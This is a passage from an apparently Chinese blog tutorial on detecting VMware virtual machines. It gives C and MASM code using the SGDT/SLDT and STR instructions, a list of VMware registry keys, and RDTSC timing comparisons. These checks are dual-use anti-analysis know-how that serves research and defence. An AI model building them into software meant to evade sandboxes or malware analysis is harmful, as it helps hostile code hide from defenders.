class=&quot;string&quot;&gt;&quot;LDT BaseAddr: 0x%x\n&quot;&lt;/span&gt;, ldt_addr);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(ldt_addr == &lt;span class=&quot;number&quot;&gt;0x0000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Native OS\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Inside VMware\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;GDTDetect&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; gdt_addr = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; gdtr[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _asm sgdt gdtr&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    gdt_addr = *((unsigned int *)&amp;amp;gdtr[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;GDT BaseAddr:0x%x\n&quot;&lt;/span&gt;, gdt_addr);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((gdt_addr &amp;gt;&amp;gt; &lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;0xff&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Inside VMware\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Native OS\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    LDTDetect();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    GDTDetect();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试结果如图3所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/3.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;                   图3&lt;br&gt;&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;方法四：基于STR的检测方法&quot;&gt;&lt;a href=&quot;#方法四：基于STR的检测方法&quot; class=&quot;headerlink&quot; title=&quot;方法四：基于STR的检测方法&quot;&gt;&lt;/a&gt;方法四：基于STR的检测方法&lt;/h3&gt;&lt;p&gt;在保护模式下运行的所有程序在切换任务时，对于当前任务中指向TSS的段选择器将会被存储在任务寄存器中，TSS中包含有当前任务的可执行环境状态，包括通用寄存器状态，段寄存器状态，标志寄存器状态，EIP寄存器状态等等，当此项任务再次被执行时，处理器就会其原先保存的任务状态。每项任务均有其自己的TSS，而我们可以通过STR指令来获取指向当前任务中TSS的段选择器。这里STR（Store task register）指令是用于将任务寄存器 (TR) 中的段选择器存储到目标操作数，目标操作数可以是通用寄存器或内存位置，使用此指令存储的段选择器指向当前正在运行的任务的任务状态段 (TSS)。在虚拟机和真实主机之中，通过STR读取的地址是不同的，当地址等于0x0040xxxx时，说明处于虚拟机中，否则为真实主机。实现代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; mem[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    __asm str mem;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot; STR base: 0x&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i&amp;lt;&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;%02x&quot;&lt;/span&gt;,mem[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( (mem[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]==&lt;span class=&quot;number&quot;&gt;0x00&lt;/span&gt;) &amp;amp;&amp;amp; (mem[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]==&lt;span class=&quot;number&quot;&gt;0x40&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;\n INSIDE MATRIX!!\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;\n Native OS!!\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试结果如图4所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/4.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;                          图4&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;方法五：基于注册表检测虚拟机&quot;&gt;&lt;a href=&quot;#方法五：基于注册表检测虚拟机&quot; class=&quot;headerlink&quot; title=&quot;方法五：基于注册表检测虚拟机&quot;&gt;&lt;/a&gt;方法五：基于注册表检测虚拟机&lt;/h3&gt;&lt;p&gt;在windows虚拟机中常常安装有VMware Tools以及其它的虚拟硬件（如网络适配器、虚拟打印机，USB集线器……），它们都会创建任何程序都可以读取的windows注册表项，因此我们可以通过检测注册表中的一些关键字符来判断程序是否处于虚拟机之中。关于这些注册表的位置我们可以通过在注册表中搜索关键词“vmware”来获取，下面是我在VMware下的WinXP中找到的一些注册表项：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_CLASSES_ROOT\Applications\VMwareHostOpen.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_CLASSES_ROOT\Installer\Products\C2A6F2EFE6910124C940B2B12CF170FE\ProductName&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值“VMware Tools”&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_CLASSES_ROOT\Installer\Products\C2A6F2EFE6910124C940B2B12CF170FE\SourceList\PackageName&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware Tools.msi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_CURRENT_USER\Printers\DeviceOld&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：_#VMwareVirtualPrinter,winspool,TPVM:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware Virtual IDE Hard Drive&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\HARDWARE\DEVICEMAP\Scsi\Scsi Port 1\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：NECVMWar VMware IDE CDR10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Installer\Products\C2A6F2EFE6910124C940B2B12CF170FE\ProductName&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware Tools&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\C2A6F2EFE6910124C940B2B12CF170FE\InstallProperties\DisplayName&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware Tools&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Reinstall\0002\DeviceDesc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware SVGA II&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkCards\2\Description&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware Accelerated AMD PCNet Adapter&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Tools&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\&amp;#123;4D36E968-E325-11CE-BFC1-08002BE10318&amp;#125;\0000\DriverDesc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware SVGA II&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\&amp;#123;4D36E968-E325-11CE-BFC1-&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;08002BE10318&amp;#125;\0000\ProviderName&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware, Inc.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\&amp;#123;4D36E972-E325-11CE-BFC1-08002bE10318&amp;#125;\0001\DriverDesc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware Accelerated AMD PCNet Adapter&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\&amp;#123;4D36E97B-E325-11CE-BFC1-08002BE10318&amp;#125;\0000\DriverDesc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware SCSI Controller&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Print\Monitors\ThinPrint Print Port Monitor for VMWare&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;除以上这些表项之外，还有很多地方可以检测，特别是虚拟机提供的虚拟化软硬件、服务之类，比如文件共享服务，VMware 物理磁盘助手服务，VMware Ethernet Adapter Driver，VMware SCSI Controller等等的这些信息都可作为检测虚拟机的手段。这里我们就以其中某表项为例编程举例一下，其它表项检测方法同理，具体代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;.386&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.model flat, stdcall&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;option casemap:none&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   include  windows.inc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   include  user32.inc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   include  kernel32.inc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   include  advapi32.inc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   includelib  user32.lib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   includelib  kernel32.lib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   includelib  advapi32.lib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.data&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;szCaption     db &amp;quot;VMware Detector &amp;quot;,0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;szInside         db &amp;quot;Inside VMware!&amp;quot;,0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;szOutside              db &amp;quot;Native OS!&amp;quot;,0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;szSubKey      db &amp;quot;software\VMWare, Inc.\VMware tools&amp;quot;,0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hKey              dd    ?&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.code&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;start:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  invoke RegOpenKeyEx, HKEY_LOCAL_MACHINE, addr szSubKey, 0,\&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 KEY_WRITE or KEY_READ, addr hKey&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .if eax == ERROR_SUCCESS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  invoke MessageBox, NULL,addr szInside, addr szCaption, MB_OK&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .else&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  invoke MessageBox, NULL,addr szOutside, addr szCaption, MB_OK&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .endif&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  invoke RegCloseKey,hKey&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  invoke ExitProcess,NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;end start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试结果如图5所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/5.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;            图5&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;方法六：基于时间差的检测方式&quot;&gt;&lt;a href=&quot;#方法六：基于时间差的检测方式&quot; class=&quot;headerlink&quot; title=&quot;方法六：基于时间差的检测方式&quot;&gt;&lt;/a&gt;方法六：基于时间差的检测方式&lt;/h3&gt;&lt;p&gt;本方法通过运行一段特定代码，然后比较这段代码在虚拟机和真实主机之中的相对运行时间，以此来判断是否处于虚拟机之中。这段代码我们可以通过RDTSC指令来实现，RDTSC指令是用于将计算机启动以来的CPU运行周期数存放到EDX：EAX里面，其中EDX是高位，而EAX是低位。下面我们以xchg    ecx,  eax 一句指令的运行时间为例，这段指令在我的真实主机windows 7系统上的运行时间为0000001E，如图6所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/6.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;              图6&lt;br&gt;&lt;br&gt;&lt;/center&gt;

&lt;p&gt;而该指令在虚拟机WinXP下的运行时间为00000442，如图7所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/7.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;               图7&lt;br&gt;&lt;/center&gt;

&lt;p&gt;两者之间的运行时间明显差别很多，在虚拟机中的运行速度远不如真实主机的，一般情况下，当它的运行时间大于0xFF时，就可以确定它处于虚拟机之中了，因此不难写出检测程序，具体实现代码如下：&lt;/p&gt;
